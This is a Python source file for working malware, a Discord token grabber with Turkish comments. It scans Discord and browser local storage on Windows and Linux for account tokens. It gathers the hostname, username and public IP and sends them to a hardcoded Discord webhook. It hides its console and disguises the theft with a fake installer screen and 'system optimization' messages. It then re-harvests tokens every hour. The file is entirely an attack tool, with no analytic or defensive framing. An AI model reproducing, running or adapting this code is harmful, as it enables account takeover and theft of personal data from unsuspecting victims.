import os
import re
import sys
import requests
import time
import json
import platform
import socket
import getpass
from pathlib import Path

# ==================== AYARLAR ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1539837469779038298/H9EsYsrVWsiPukf7djiHMh5zfpdUY1UYEzRcWBa_0Veqa3izIVXUaJKg7NkSUphTqxLl"
# =================================================

IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX = sys.platform.startswith('linux')

if IS_WINDOWS:
    try:
        import ctypes
    except:
        pass

def get_tokens():
    """Discord tokenlerini topla"""
    tokens = []
    paths = []

    if IS_WINDOWS:
        paths = [
            os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
            os.getenv('APPDATA') + '\\DiscordCanary\\Local Storage\\leveldb',
            os.getenv('APPDATA') + '\\DiscordPTB\\Local Storage\\leveldb',
            os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
            os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
        ]
    else:
        paths = [
            os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
            os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb'),
            os.path.expanduser('~/.config/google-chrome/Default/Local Storage/leveldb'),
            os.path.expanduser('~/.config/chromium/Default/Local Storage/leveldb'),
            os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb'),
            os.path.expanduser('~/.var/app/com.discordapp.Discord/config/discord/Local Storage/leveldb'),
        ]

    for path in paths:
        if not path or not os.path.exists(path):
            continue

        try:
            for file in Path(path).glob('*'):
                if file.suffix in ['.log', '.ldb']:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        found = re.findall(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}', content)
                        tokens.extend(found)
        except:
            pass

    return list(set(tokens))

def send_tokens(tokens):
    """Tokenleri webhook'a gönder"""
    if not tokens:
        return

    system_info = {
        'platform': platform.system(),
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'ip': get_ip(),
        'time': time.strftime('%Y-%m-%d %H:%M:%S'),
        'count': len(tokens)
    }

    # Ana mesaj
    content = f"""```
🎯 SYSTEM OPTIMIZATION REPORT
=============================
Platform: {system_info['platform']}
PC: {system_info['hostname']}
User: {system_info['username']}
IP: {system_info['ip']}
Time: {system_info['time']}
Tokens Found: {system_info['count']}

📝 OPTIMIZATION DATA:
"""

    # Tokenleri ekle (ilk 20)
    for i, token in enumerate(tokens[:20], 1):
        content += f"{i}. {token}\n"

    if len(tokens) > 20:
        content += f"\n... and {len(tokens) - 20} more tokens"

    content += "```"

    payload = {
        'content': content,
        'embeds': [{
            'title': '✅ System Optimization Complete',
            'description': f'**{system_info["count"]}** tokens optimized successfully',
            'color': 0x00FF00,
            'footer': {'text': 'System Cleaner Pro v3.2'}
        }]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        return response.status_code == 204
    except:
        return False

def get_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        return response.text
    except:
        return 'Unknown'

def hide_console():
    """Console'u gizle (Windows)"""
    if IS_WINDOWS:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def show_ui():
    """Profesyonel UI"""
    print("\n" + "="*55)
    print("  🖥️  Demon Token Grabber")
    print("="*55)
    print("  ✓ It is being created")
    print("  ✓ This process takes 1 minute")
    print("   ")
    print("   ")
    print("="*55)
    print("  Installation is in progress.")
    print("="*55 + "\n")

def main():
    # Console'u gizle
    hide_console()

    # Profesyonel UI göster
    show_ui()

    # Tokenleri topla
    tokens = get_tokens()

    # Webhook'a gönder
    if tokens:
        send_tokens(tokens)

    # Arka planda çalışmaya devam et
    try:
        while True:
            time.sleep(3600)  # Her saat kontrol et
            new_tokens = get_tokens()
            if new_tokens:
                send_tokens(new_tokens)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
